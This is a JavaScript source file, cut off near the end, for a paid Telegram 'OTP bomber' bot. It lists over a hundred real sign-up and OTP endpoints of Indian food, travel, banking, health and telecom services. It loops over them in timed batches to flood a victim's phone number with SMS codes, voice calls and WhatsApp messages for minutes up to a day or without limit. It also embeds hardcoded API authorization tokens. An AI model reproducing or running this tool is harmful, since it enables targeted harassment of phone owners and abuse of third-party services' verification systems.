// bot.js – Complete OTP Bomber with 102 APIs + 20 Calls Per Cycle (MAXIMUM POWER)
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');
const https = require('https');
const { BOT_TOKEN, ADMIN_IDS } = require('./config');
const db = require('./database');
const fs = require('fs');
const path = require('path');

// ===== HTTP AGENTS =====
const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 300, maxFreeSockets: 100 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 300, maxFreeSockets: 100 });

// ===== MEMORY MANAGEMENT =====
const MEMORY_LIMIT = 500;
let lastGCTime = Date.now();

function checkMemory() {
    const now = Date.now();
    if (now - lastGCTime < 30000) return;
    lastGCTime = now;
    const used = process.memoryUsage().heapUsed / 1024 / 1024;
    if (used > MEMORY_LIMIT) {
        console.log(`⚠️ Memory high (${used.toFixed(1)}MB), running GC...`);
        if (global.gc) global.gc();
    }
}

// ===== ERROR HANDLING =====
process.on('uncaughtException', (err) => console.error('❌', err.message));
process.on('unhandledRejection', (reason) => console.error('❌', reason));

const bot = new TelegramBot(BOT_TOKEN, { polling: { interval: 50, autoStart: true } });

// ===== STATUS MAPS =====
const bombingStatus = new Map();
const userStates = new Map();
const pendingPayments = new Map();
const pendingScreenshots = new Map();
const adminBroadcastState = new Map();

// ===== SPEED SETTINGS =====
const BATCH_SIZE = 5;           // 5 APIs per batch
const BATCH_DELAY = 200;        // 200ms gap between batches (20 batches = 4 seconds per cycle)
const API_TIMEOUT = 2000;
const MAX_RETRIES = 0;
const CALLS_PER_CYCLE = 20;     // 20 batches = 20 calls per number per cycle

// ===== QR CODE PATH =====
let qrCodePath = path.join(__dirname, 'qr_code.jpg');
let qrCodeSet = false;

// ============================================================
// ===== 102 API CONFIGURATIONS =====
// ============================================================

const SMS_APIS = [
    // Food & Delivery (10 APIs)
    { name: "Swiggy", method: "POST", url: "https://www.swiggy.com/mapi/auth/signup", headers: { "content-type": "application/json", "origin": "https://www.swiggy.com" }, data: (p) => JSON.stringify({ mobile: p, name: "User", email: `u${p}@gmail.com`, password: "Test@123456" }) },
    { name: "Zomato", method: "POST", url: "https://www.zomato.com/webroutes/auth/login", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p, country_id: 1, method: "phone", verification_type: "sms" }) },
    { name: "Dominos", method: "POST", url: "https://api.dominos.co.in/loginhandler/forgotpassword", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, lastName: "", firstName: "" }) },
    { name: "PizzaHut", method: "POST", url: "https://api.pizzahut.io/v1/otp/generate", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: "+91" + p }) },
    { name: "KFC", method: "POST", url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phoneNumber: p, Resend: "false" }) },
    { name: "BurgerKing", method: "POST", url: "https://consumer-apis.burgerking.in/api/v1/user/signUp", headers: { "content-type": "application/json", "platform": "web" }, data: (p) => JSON.stringify({ phone_no: p }) },
    { name: "Dineout", method: "POST", url: "https://www.dineout.co.in/xhrajaxrequest/user_signup", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}&name=Test&email=t${p}@gmail.com` },
    { name: "Dunzo", method: "POST", url: "https://apis.dunzo.in/api/v1/send_otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone_number: "+91" + p }) },
    { name: "Grofers", method: "POST", url: "https://grofers.com/v2/accounts/", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `user_phone=${p}` },
    { name: "FBBOnline", method: "POST", url: "https://www.fbbonline.in/customer/account/GenerateOtp", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `RegistrationForm%5Bcontact_number%5D=${p}&RegistrationForm%5Bemail%5D=t${p}@gmail.com&RegistrationForm%5Bfirst_name%5D=Test` },

    // Travel & Transport (10 APIs)
    { name: "Ola", method: "POST", url: "https://accounts.olacabs.com/api/login", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobileNumber: p, dialingCode: "+91", countryCode: "IN" }) },
    { name: "Uber", method: "POST", url: "https://auth.uber.com/v2/login", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: "+91" + p }) },
    { name: "Rapido", method: "POST", url: "https://customer.rapido.bike/api/otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Oyo", method: "POST", url: "https://www.oyorooms.com/api/pwa/generateotp", headers: { "content-type": "text/plain;charset=UTF-8" }, data: (p) => JSON.stringify({ phone: p, country_code: "+91", nod: 4 }) },
    { name: "MakeMyTrip", method: "POST", url: "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered", headers: { "content-type": "application/json", "authorization": "h4nhc9jcgpAGIjp" }, data: (p) => JSON.stringify({ loginId: p, type: "MOBILE", version: 2, countryCode: "91" }) },
    { name: "RedBus", method: "GET", url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91", headers: {}, data: null, phoneInUrl: true },
    { name: "EasyMyTrip", method: "POST", url: "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ emailph: p }) },
    { name: "HappyEasyGo", method: "GET", url: "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}", headers: {}, data: null, phoneInUrl: true },
    { name: "Ixigo", method: "POST", url: "https://www.ixigo.com/api/v2/auth/sendotp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, countryCode: "+91" }) },
    { name: "Yatra", method: "POST", url: "https://www.yatra.com/api/v1/auth/sendOtp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },

    // E-Commerce (10 APIs)
    { name: "Flipkart", method: "POST", url: "https://1.rome.api.flipkart.com/1/action/view", headers: { "content-type": "application/json", "x-user-agent": "FKUA/msite/Mobile" }, data: (p) => JSON.stringify({ actionRequestContext: { type: "LOGIN_IDENTITY_VERIFY", loginIdPrefix: "+91", loginId: p, loginType: "MOBILE", verificationType: "OTP" } }) },
    { name: "Amazon", method: "POST", url: "https://www.amazon.in/ap/signin", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `openid.return_to=https://www.amazon.in&phoneNumber=${p}&claimCode=SendOTP` },
    { name: "Snapdeal", method: "POST", url: "https://m.snapdeal.com/signupCompleteAjax", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `j_mobilenumber=${p}&agree=true&j_fullname=Test&journey=mobile` },
    { name: "Nykaa", method: "POST", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `mobile_number=${p}&source=sms` },
    { name: "Ajio", method: "POST", url: "https://login.web.ajio.com/api/auth/signupSendOTP", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ firstName: "Test", login: `t${p}@gmail.com`, password: "Test@123456", mobileNumber: p, requestType: "SENDOTP" }) },
    { name: "Limeroad", method: "POST", url: "https://www.limeroad.com/auth/get_uuid_v2", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `user_id=${p}` },
    { name: "Cilory", method: "POST", url: "https://www.cilory.com/app/w/auth/soft", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Purplle", method: "GET", url: "https://www.purplle.com/api/account/authorization/send_otp?phone={phone}&action=register", headers: {}, data: null, phoneInUrl: true },
    { name: "Banggood", method: "POST", url: "https://m.banggood.in/index.php", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `com=login&t=sendMtSms&c=api&mobilePhone=${p}&countryPhoneCode=91` },
    { name: "Meesho", method: "POST", url: "https://www.meesho.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: "+91" + p }) },

    // Entertainment (10 APIs)
    { name: "Hotstar", method: "PUT", url: "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", headers: { "content-type": "application/json", "x-country-code": "IN", "x-hs-platform": "PCTV" }, data: (p) => JSON.stringify({ phone_number: p, country_prefix: "91" }) },
    { name: "AltBalaji", method: "POST", url: "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone_number: p, country_code: "91", platform: "web" }) },
    { name: "Voot", method: "POST", url: "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ type: "mobile", mobile: p, countryCode: "+91" }) },
    { name: "SonyLIV", method: "POST", url: "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobileNumber: p, channelPartnerID: "MSMIND", country: "IN", timestamp: new Date().toISOString() }) },
    { name: "Zee5", method: "GET", url: "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}", headers: {}, data: null, phoneInUrl: true },
    { name: "Ullu", method: "POST", url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({}), phoneInUrl: true },
    { name: "Gaana", method: "POST", url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: "91-" + p }) },
    { name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobileNo: p, countryCode: "+91", appCode: "un" }) },
    { name: "MXPlayer", method: "POST", url: "https://api.mxplayer.in/v1/user/otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p, countryCode: "IN" }) },
    { name: "JioCinema", method: "POST", url: "https://www.jiocinema.com/api/auth/v1/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobileNumber: p }) },

    // Banking & Finance (10 APIs)
    { name: "Paytm", method: "POST", url: "https://accounts.paytm.com/v2/api/register", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, email: "", loginPassword: "Pura@1090" }) },
    { name: "Kotak811", method: "POST", url: "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `cust_mobile=${p}&cust_full_name=Test&cust_email=t${p}@gmail.com` },
    { name: "AngelBroking", method: "POST", url: "https://www.angelbroking.com/form-gateways/oda-form.php", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `mobile=${p}&name=Test&city=pune` },
    { name: "ICICI", method: "POST", url: "https://www.icicibank.com/api/otp/generate", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "HDFC", method: "POST", url: "https://leads.hdfcbank.com/applications/webforms/apply/otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "AxisBank", method: "POST", url: "https://www.axisbank.com/api/otp/send", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "BajajFinserv", method: "POST", url: "https://www.bajajfinserv.in/api/otp/generate", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobileNumber: p }) },
    { name: "GetInstaCash", method: "POST", url: "https://getinstacash.in/sell/getData.php", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `type=sendOTP&mobile=${p}` },
    { name: "Groww", method: "POST", url: "https://api.groww.in/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p, countryCode: "+91" }) },
    { name: "Upstox", method: "POST", url: "https://api.upstox.com/v2/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },

    // Health & Pharmacy (10 APIs)
    { name: "Apollo247", method: "POST", url: "https://webapi.apollo247.com/", headers: { "content-type": "application/json", "Authorization": "Bearer 3d1833da7020e0602165529446587434" }, data: (p) => JSON.stringify({ operationName: "Login", variables: { mobileNumber: "+91" + p, loginType: "PATIENT" }, query: "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) { login(mobileNumber: $mobileNumber, loginType: $loginType) { status message } }" }) },
    { name: "MedPlus", method: "POST", url: "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `mobileNumber=${p}&firstName=Test&emailId=t${p}@gmail.com&password=Test@123&confirmpwd=Test@123` },
    { name: "PharmEasy", method: "POST", url: "https://pharmeasy.in/api/v2/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "Netmeds", method: "GET", url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}", headers: {}, data: null, phoneInUrl: true },
    { name: "1mg", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ number: p }) },
    { name: "Practo", method: "POST", url: "https://www.practo.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p, countryCode: "+91" }) },
    { name: "TataHealth", method: "POST", url: "https://www.tatahealth.com/api/v1/auth/otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "CureFit", method: "POST", url: "https://api.curefit.com/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "FloMattress", method: "POST", url: "https://cod.flomattress.com/api/otp", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `number=${p}` },
    { name: "HealthKart", method: "POST", url: "https://www.healthkart.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },

    // Education (10 APIs)
    { name: "Unacademy", method: "POST", url: "https://unacademy.com/api/v3/user/user_check/", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p, country_code: "IN", otp_type: 1, send_otp: true }) },
    { name: "Byjus", method: "POST", url: "https://bcas-prod.byjusweb.com/api/send-otp", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `phoneNumber=${p}&page=free-trial-classes` },
    { name: "Vedantu", method: "POST", url: "https://user.vedantu.com/user/preLoginVerification", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phoneNumber: p, phoneCode: "+91", ver: "11.345" }) },
    { name: "Doubtnut", method: "POST", url: "https://doubtnut.com/api/v1/user/login", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}` },
    { name: "Cuemath", method: "POST", url: "https://www.cuemath.com/api/v4/parents/", headers: { "content-type": "application/JSON" }, data: (p) => JSON.stringify({ phone: p, intl_mobile: { phone: p }, email: `t${p}@gmail.com`, full_name: "Test" }) },
    { name: "Aakash", method: "POST", url: "https://digital.aakash.ac.in/signup-otp-verify", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `mobileval=${p}` },
    { name: "Aakash2", method: "POST", url: "https://digital.aakash.ac.in/mkt-signup-otp-verify", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `mobileval=${p}&otp=6230` },
    { name: "Careers360", method: "POST", url: "https://www.careers360.com/ajax/no-cache/user/otp-send", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `mobile_number=${p}` },
    { name: "Toppr", method: "POST", url: "https://www.toppr.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "WhiteHatJr", method: "POST", url: "https://www.whitehatjr.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, countryCode: "+91" }) },

    // Real Estate & Auto (10 APIs)
    { name: "NoBroker", method: "POST", url: "https://www.nobroker.in/api/v3/account/otp/send", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}&countryCode=IN` },
    { name: "Housing", method: "POST", url: "https://housing.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "MagicBricks", method: "POST", url: "https://www.magicbricks.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "99acres", method: "POST", url: "https://www.99acres.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Spinny", method: "POST", url: "https://api.spinny.com/api/c/user/otp-request/v3/", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ contact_number: p, whatsapp: false, code_len: 4 }) },
    { name: "CarDekho", method: "POST", url: "https://www.cardekho.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "BikeDekho", method: "POST", url: "https://www.bikedekho.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "CarWale", method: "POST", url: "https://www.carwale.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "ZigWheels", method: "POST", url: "https://www.zigwheels.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "OLX", method: "POST", url: "https://www.olx.in/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: "+91" + p }) },

    // Other Services (10 APIs)
    { name: "BookMyShow", method: "POST", url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ channel: "phone", subChannel: "sms", details: { phone: p, origin: "https://in.bookmyshow.com" } }) },
    { name: "BigBasket", method: "POST", url: "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", headers: { "content-type": "application/json", "x-channel": "BB-PWA" }, data: (p) => JSON.stringify({ identifier: p }) },
    { name: "UrbanCompany", method: "POST", url: "https://www.urbanclap.com/api/v2/growth/profile/generateOTP", headers: { "content-type": "application/json;charset=UTF-8" }, data: (p) => JSON.stringify({ phone: { isd_code: "+91", phone_wo_isd: p }, country_id: "IND", device_type: "customer" }) },
    { name: "Lenskart", method: "POST", url: "https://api.lenskart.com/v2/customers/sendOtp", headers: { "content-type": "application/json;charset=UTF-8", "x-api-client": "mobilesite" }, data: (p) => JSON.stringify({ telephone: p }) },
    { name: "Quikr", method: "POST", url: "https://www.quikr.com/core/sendOtp", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `user=${p}` },
    { name: "Ogonn", method: "POST", url: "https://ogonn.in/otp", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `mobile=${p}` },
    { name: "Cansell", method: "POST", url: "https://webapi.cansell.in/api/User/SignUp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p, name: "Test", surname: "User", email: `t${p}@gmail.com`, password: "Test@123" }) },
    { name: "Coolwinks", method: "GET", url: "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}", headers: {}, data: null, phoneInUrl: true },
    { name: "Dream11", method: "POST", url: "https://www.dream11.com/graphql/mutation/pwa/register", headers: { "content-type": "application/json", "device": "pwa" }, data: (p) => JSON.stringify({ query: "mutation register($email: String!, $mobileNumber: String!, $password: String!) { registerSendOTPMutation(email: $email, mobileNumber: $mobileNumber, password: $password) { message }}", variables: { email: `u${p}@gmail.com`, mobileNumber: p, password: "Test@123456" } }) },
    { name: "Dream11v2", method: "POST", url: "https://www.dream11.com/auth/passwordless/init", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: p }) },

    // Telecom & Utilities (5 APIs)
    { name: "Jio", method: "POST", url: "https://www.jio.com/api/v1/generate-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobileNumber: p }) },
    { name: "Airtel", method: "POST", url: "https://www.airtel.in/api/v1/otp/generate", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Vi", method: "POST", url: "https://www.myvi.in/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "BSNL", method: "POST", url: "https://www.bsnl.in/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "JioFiber", method: "POST", url: "https://fiber.jio.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },

    // Insurance (2 APIs)
    { name: "PolicyBazaar", method: "POST", url: "https://www.policybazaar.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Acko", method: "POST", url: "https://www.acko.com/api/v1/auth/send-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
];

const VOICE_APIS = [
    { name: "TataCap_V", method: "POST", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p, isOtpViaCallAtLogin: "true" }), type: "voice" },
    { name: "1mg_V", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ number: p, otp_on_call: true }), type: "voice" },
    { name: "Swiggy_V", method: "POST", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), type: "voice" },
    { name: "Flipkart_V", method: "POST", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), type: "voice" },
    { name: "Paytm_V", method: "POST", url: "https://accounts.paytm.com/signin/voice-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), type: "voice" },
    { name: "Ola_V", method: "POST", url: "https://api.olacabs.com/v1/voice-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: p }), type: "voice" },
    { name: "Uber_V", method: "POST", url: "https://auth.uber.com/v2/voice-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: "+91" + p }), type: "voice" },
    { name: "Zomato_V", method: "POST", url: "https://www.zomato.com/php/o2_api_handler.php", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}&type=voice`, type: "voice" },
    { name: "Amazon_V", method: "POST", url: "https://www.amazon.in/api/v1/voice-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ phone: "+91" + p }), type: "voice" },
    { name: "Myntra_V", method: "POST", url: "https://www.myntra.com/api/v1/voice-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }), type: "voice" },
];

const WHATSAPP_APIS = [
    { name: "KPN_WA", method: "POST", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: p } }), type: "whatsapp" },
    { name: "Foxy_WA", method: "POST", url: "https://www.foxy.in/api/v2/users/send_otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ user: { phone_number: "+91" + p }, via: "whatsapp" }), type: "whatsapp" },
    { name: "Rappi_WA", method: "POST", url: "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ country_code: "+91", phone: p }), type: "whatsapp" },
    { name: "Nykaa_WA", method: "POST", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", headers: { "content-type": "application/x-www-form-urlencoded" }, data: (p) => `mobile_number=${p}&source=whatsapp`, type: "whatsapp" },
    { name: "Swiggy_WA", method: "POST", url: "https://www.swiggy.com/mapi/auth/whatsapp-otp", headers: { "content-type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, channel: "whatsapp" }), type: "whatsapp" },
];

const allApis = [...SMS_APIS, ...VOICE_APIS, ...WHATSAPP_APIS];
console.log(`✅ Loaded ${allApis.length} APIs (SMS: ${SMS_APIS.length}, Voice: ${VOICE_APIS.length}, WA: ${WHATSAPP_APIS.length})`);

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

async function makeApiCall(api, phone) {
    try {
        let url = api.url;
        if (api.phoneInUrl) url = url.replace(/{phone}/g, phone);

        let data = null;
        if (typeof api.data === 'function') data = api.data(phone);
        else if (api.data) data = api.data;

        const config = {
            method: api.method,
            url: url,
            headers: { ...api.headers, "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36" },
            timeout: API_TIMEOUT,
            httpAgent, httpsAgent,
            validateStatus: () => true
        };

        if (data && (api.method === 'POST' || api.method === 'PUT')) config.data = data;

        const response = await axios(config);
        return { success: response.status < 500, type: api.type || 'sms', name: api.name };
    } catch (err) {
        return { success: false, type: api.type || 'sms', name: api.name };
    }
}

async function processApiBatch(apiBatch, phone) {
    const results = await Promise.allSettled(apiBatch.map(api => makeApiCall(api, phone)));
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    
    for (let i = 0; i < results.length; i++) {
        const result = results[i];
        if (result.status === 'fulfilled' && result.value && result.value.success) {
            success++;
            if (result.value.type === 'voice') callCount++;
            else if (result.value.type === 'whatsapp') whatsappCount++;
            else smsCount++;
        }
    }
    return { success, smsCount, callCount, whatsappCount };
}

async function runBomber(chatId, phone, durationMinutes) {
    const protectedList = await db.getProtected();
    if (protectedList.includes(phone)) {
        bot.sendMessage(chatId, '⚠️ This number is PROTECTED by admin.');
        bombingStatus.set(chatId, false);
        return;
    }
    if (bombingStatus.get(chatId)) return bot.sendMessage(chatId, '❌ Already bombing. Use /stop.');

    bombingStatus.set(chatId, true);
    const user = await db.getUser(chatId);
    const isUnlimited = user.daily_unlimited > Date.now() / 1000;

    if (!isUnlimited) {
        const cost = getBombCost(durationMinutes);
        if (!ADMIN_IDS.includes(Number(chatId)) && user.credits < cost) {
            bot.sendMessage(chatId, `❌ Need ${cost} credits. You have ${user.credits}.`);
            bombingStatus.set(chatId, false);
            return;
        }
        await db.updateCredits(chatId, -cost);
    }

    user.total_attacks += 1;
    await user.save();

    const sessionId = `${Date.now()}_${phone}`;
    user.bomb_sessions.push({ session_id: sessionId, phone, start_time: Date.now() / 1000, duration: durationMinutes, is_unlimited: isUnlimited });
    await user.save();

    const totalBatches = Math.ceil(allApis.length / BATCH_SIZE);
    
    const msg = await bot.sendMessage(chatId,
        `⚔️ **BOMBING STARTED**\n📱 \`${phone}\`\n⏱️ ${getDurationText(durationMinutes)}\n🚀 ${allApis.length} APIs in ${totalBatches} batches\n📞 ${CALLS_PER_CYCLE} calls per cycle to target\n${isUnlimited ? '⭐ UNLIMITED' : `💳 ${getBombCost(durationMinutes)} credits`}`,
        { parse_mode: 'Markdown' });

    let smsCount = 0, callCount = 0, whatsappCount = 0, totalSent = 0, cycleCount = 0;
    let lastUpdate = Date.now();
    const endTime = Date.now() / 1000 + (durationMinutes === 1440 ? 86400 : durationMinutes * 60);

    while (bombingStatus.get(chatId)) {
        if (!isUnlimited && Date.now() / 1000 >= endTime) break;
        checkMemory();

        // Process APIs in batches of 5 - target gets hit EVERY batch
        for (let i = 0; i < allApis.length; i += BATCH_SIZE) {
            if (!bombingStatus.get(chatId)) break;
            if (!isUnlimited && Date.now() / 1000 >= endTime) break;
            
            const batch = allApis.slice(i, i + BATCH_SIZE);
            const result = await processApiBatch(batch, phone);
            
            totalSent += result.success;
            smsCount += result.smsCount;
            callCount += result.callCount;
            whatsappCount += result.whatsappCount;
            
            // 200ms gap between each batch = target gets call every ~200ms
            if (i + BATCH_SIZE < allApis.length) {
                await new Promise(r => setTimeout(r, BATCH_DELAY));
            }
        }
        
        cycleCount++;

        const now = Date.now();
        if (now - lastUpdate >= 500) {
            lastUpdate = now;
            const timeLeft = isUnlimited ? '∞' : Math.floor(endTime - now / 1000);
            const tl = typeof timeLeft === 'number' ? `${Math.floor(timeLeft/60)}m ${timeLeft%60}s` : '∞';
            try {
                await bot.editMessageText(
                    `⚔️ **BOMBING**\n📱 \`${phone}\`\n⏱️ ${tl}\n📨 ${smsCount} | 📞 ${callCount} | 📱 ${whatsappCount}\n🔄 ${cycleCount} cycles\n📊 ${cycleCount * allApis.length} attempts\n📞 ${cycleCount * totalBatches} calls to target\n\n🔴 /stop`,
                    { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' });
            } catch (e) {}
        }
    }

    bombingStatus.set(chatId, false);
    await bot.editMessageText(
        `✅ **DONE**\n📱 \`${phone}\`\n📨 ${smsCount} | 📞 ${callCount} | 📱 ${whatsappCount}\n🔄 ${cycleCount} cycles\n📊 ${cycleCount * allApis.length} attempts\n📞 ${cycleCount * totalBatches} calls hit target`,
        { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' });

    const updatedUser = await db.getUser(chatId);
    const session = updatedUser.bomb_sessions.find(s => s.session_id === sessionId);
    if (session) {
        session.end_time = Date.now() / 1000;
        session.total_sent = totalSent;
        session.sms_count = smsCount;
        session.call_count = callCount;
        session.whatsapp_count = whatsappCount;
        session.cycles = cycleCount;
        await updatedUser.save();
    }
}

function getBombCost(m) { return m === 1440 ? 100 : m <= 10 ? m : 10; }

function getDurationText(m) {
    if (m === 1440) return '1 Day';
    if (m < 60) return `${m}m`;
    const h = Math.floor(m/60), min = m%60;
    return min === 0 ? `${h}h` : `${h}h ${min}m`;
}

// ============================================================
// ===== KEYBOARDS =====
// ============================================================
function mainKeyboard() {
    return { reply_markup: { keyboard: [
